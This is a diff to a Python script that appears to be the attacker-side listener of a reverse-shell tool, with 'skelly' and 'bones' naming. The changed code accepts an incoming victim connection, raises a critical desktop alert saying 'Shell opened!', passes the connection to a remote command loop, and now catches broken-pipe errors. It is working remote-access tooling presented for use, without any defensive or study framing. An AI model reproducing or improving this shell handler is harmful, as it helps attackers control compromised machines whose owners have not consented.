@@ -14,13 +14,9 @@ print("\____/|_|\_\____/|_|_|\__, \____/  \___/|_| |_|\___||___/ ")
 print("                       __/ | ")
 print("                      |___/ ")
 
-# add more functionality
-
 ### Run in background Unix: python3 myfile &
 
 ### simply raising the ammount of bytes sent changes things... mess with this and monitor network resources being used 
-
-# handle broken pipe exception
 
 ## Notification settings:
 ICON_PATH = "/image/skelly.png"
@@ -57,15 +53,17 @@ def connect_bones():
 
 # Connect
 def create_skeleton():
-	# socket MUST be listening before it can accept
-	conn, address = s.accept()
-	print(Style.BRIGHT + Fore.BLUE + "[i] Connected to " + address[0] + ':' + str(port) + Style.RESET_ALL)
-	n = notify2.Notification("Shell opened!", message = 'Connection succesfully established', icon = ICON_PATH)
-	n.set_urgency(notify2.URGENCY_CRITICAL) # low, normal, critical
-	n.show()
-	command_skeleton(conn)
-	# handle broken pipe exception !!!
-	conn.close()
+	try:
+		# socket MUST be listening before it can accept
+		conn, address = s.accept()
+		print(Style.BRIGHT + Fore.BLUE + "[i] Connected to " + address[0] + ':' + str(port) + Style.RESET_ALL)
+		n = notify2.Notification("Shell opened!", message = 'Connection succesfully established', icon = ICON_PATH)
+		n.set_urgency(notify2.URGENCY_CRITICAL) # low, normal, critical
+		n.show()
+		command_skeleton(conn)
+		conn.close()
+	except BrokenPipeError:
+		print(Style.BRIGHT + Fore.RED + "[☠] Broken Pipe. Closing shell" + Style.RESET_ALL + "\n")
 
 def command_skeleton(conn):
 	while True:
